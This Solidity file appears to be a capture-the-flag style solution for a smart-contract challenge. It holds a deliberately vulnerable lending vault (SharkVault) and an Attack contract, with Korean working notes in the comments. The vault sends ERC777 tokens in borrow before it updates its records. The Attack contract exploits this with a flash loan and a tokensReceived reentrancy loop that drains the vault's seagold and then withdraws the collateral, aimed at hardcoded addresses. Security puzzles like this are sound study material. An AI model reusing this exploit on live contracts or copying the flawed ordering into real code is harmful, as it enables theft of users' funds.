// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/interfaces/IERC20.sol";
import "@openzeppelin/contracts/interfaces/IERC777.sol";
import "@openzeppelin/contracts/interfaces/IERC777Sender.sol";
import "@openzeppelin/contracts/interfaces/IERC777Recipient.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SharkVault {

    // The Shark charges predatory interest rates...
    uint256 constant public INTEREST_RATE_PERCENT = 1;

    IERC20 immutable public gold;
    IERC20 immutable public seagold;

    struct LoanAccount {
        uint256 depositedGold;
        uint256 borrowedSeagold;
        uint256 lastBlock;
    }

    mapping(address => LoanAccount) private accounts;

    constructor(
        IERC20 _gold,
        IERC20 _seagold
    ) {
        gold =  _gold;
        seagold = _seagold;
    }

    /**
     * @notice Deposit gold as collateral. 
     * @param _amount Amount of gold to deposit.
     * @dev Gold must be approved for transfer beforehand.
     */
    function depositGold(uint256 _amount) external payable {

        accounts[msg.sender].depositedGold += _amount;
        gold.transferFrom(msg.sender, address(this), _amount);

    }

    /**
     * @notice Withdraw gold collateral.
     * @param _amount Amount of gold to withdraw.
     * @dev Any existing seagold loan must still be 
     * sufficiently collateralized.
     */
    function withdrawGold(uint256 _amount) external payable { // borrower가 lender에게 seaGold를 왜 안주는지?

        LoanAccount memory account = updatedAccount(msg.sender);
        account.depositedGold -= _amount;

        require(_hasEnoughCollateral(account), "Undercollateralized $SEAGOLD loan");
        accounts[msg.sender] = account;

        gold.transfer(msg.sender, _amount);

    }

    /**
     * @notice Borrow seagold.
     * @param _amount Amount of seagold to borrow.
     * @dev Seagold loan has be sufficiently collateralized 
     * by previously deposited gold.
     */
    function borrow(uint256 _amount) external { // 왜 빌린 seaGold 올리고 revert? -> accounts에 추가하지 않았으니 상관 없다.

        LoanAccount memory borrowerAccount = updatedAccount(msg.sender);
        borrowerAccount.borrowedSeagold += _amount;

        // Fail if insufficient remaining balance of $SEAGOLD
        uint256 seagoldBalance = seagold.balanceOf(address(this));
        require(_amount <= seagoldBalance, "Insufficient $SEAGOLD to lend");

        // Fail if borrower has insufficient gold collateral
        require(_hasEnoughCollateral(borrowerAccount), "Undercollateralized $SEAGOLD loan"); // deposit한 Gold 양이 부족

        // Transfer $SEAGOLD and update records
        seagold.transfer(msg.sender, _amount); // <============== 
        accounts[msg.sender] = borrowerAccount;

    }

    /**
     * @notice Repay borrowed seagold.
     * @param _amount Amount of seagold to repay.
     * @dev Seagold must be approved for transfer beforehand.
     */
    function repay(uint256 _amount) external { // 빌린 seaGold를 상환, 일부도 가능

        LoanAccount memory account = updatedAccount(msg.sender);
        account.borrowedSeagold -= _amount;
        accounts[msg.sender] = account;

        seagold.transferFrom(msg.sender, address(this), _amount);

    }

    /**
     * @notice Liquidate an existing undercollateralized loan. 
     * The smart contract effectively seizes the gold collateral.
     * @param _borrower Owner of the loan.
     */
    function liquidate(address _borrower) external { // 청산

        LoanAccount memory borrowerAccount = updatedAccount(_borrower);

        require(!_hasEnoughCollateral(borrowerAccount), "Borrower has good collateral");
        delete accounts[_borrower];

    }

    /**
     * @notice Get the loan account of a user, with updated interest.
     * @param _accountOwner Owner of the loan.
     */
    function updatedAccount(
        address _accountOwner
    ) public view returns (LoanAccount memory account) {

        account = accounts[_accountOwner];

        if (account.borrowedSeagold > 0) {
            uint256 blockDelta = block.number - account.lastBlock;
            uint256 interest = account.borrowedSeagold * blockDelta * INTEREST_RATE_PERCENT / 100; // blockDelta만큼 1% 이자 청구

            account.depositedGold = (account.depositedGold >= interest) 
                ? account.depositedGold - interest 
                : 0;
        }

        account.lastBlock = block.number;

    }

    /**
     * @dev Returns true if `_account` is sufficiently collateralized by gold.
     * Collateral ratio => 1 GOLD : 0.75 SEAGOLD
     */
    function _hasEnoughCollateral(LoanAccount memory _account) private pure returns (bool) {

        return (3 * _account.depositedGold >= 4 * _account.borrowedSeagold); // 1:0.75 비율을 유지하는지 확인
        
    }
}

contract Attack is IERC3156FlashBorrower, IERC777Recipient {
    enum Action {NORMAL, OTHER}
    SharkVault target;
    IERC1820Registry constant internal ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    address seaGold = 0x8fd03562Ffa407d478F481be4498A4dccdc4e03f;
    IERC3156FlashLender lender;

    constructor (address lenderAddress_) {
        lender = IERC3156FlashLender(lenderAddress_);
        target = SharkVault(0xb0B8164Ac7cde5B5C08264cA2075853bcC21EeC3);
        ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC777TokensRecipient"), address(this));
    }

    function onFlashLoan( // flashLoan 함수 실행하며 수행
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns(bytes32) {
        require(
            msg.sender == address(lender),
            "FlashBorrower: Untrusted lender"
        );
        require(
            initiator == address(this),
            "FlashBorrower: Untrusted loan initiator"
        );
        IERC20(token).approve(address(target), amount);

        target.depositGold(amount);

        uint256 maxSeaGold = amount / 100 * 75;

        target.borrow(maxSeaGold);

        // IERC777(seaGold).balanceOf(0xb0B8164Ac7cde5B5C08264cA2075853bcC21EeC3);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    event Log(address);

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if(IERC777(seaGold).balanceOf(0xb0B8164Ac7cde5B5C08264cA2075853bcC21EeC3) > 0) {
            target.borrow(amount);
        } else {
            target.withdrawGold(1000*(10**18));
            // target.liquidate(to);
        }
    }

    function flashBorrow(
        address token,
        uint256 amount
    ) public {
        bytes memory data = abi.encode(Action.NORMAL);
        uint256 _allowance = IERC20(token).allowance(address(this), address(lender));
        uint256 _fee = lender.flashFee(token, amount);
        uint256 _repayment = amount + _fee;
        IERC20(token).approve(address(lender), _allowance + _repayment);
        lender.flashLoan(this, token, amount, data); // <=== 여기서 transfer, onFlashLoan, transferFrom 호출
    }
}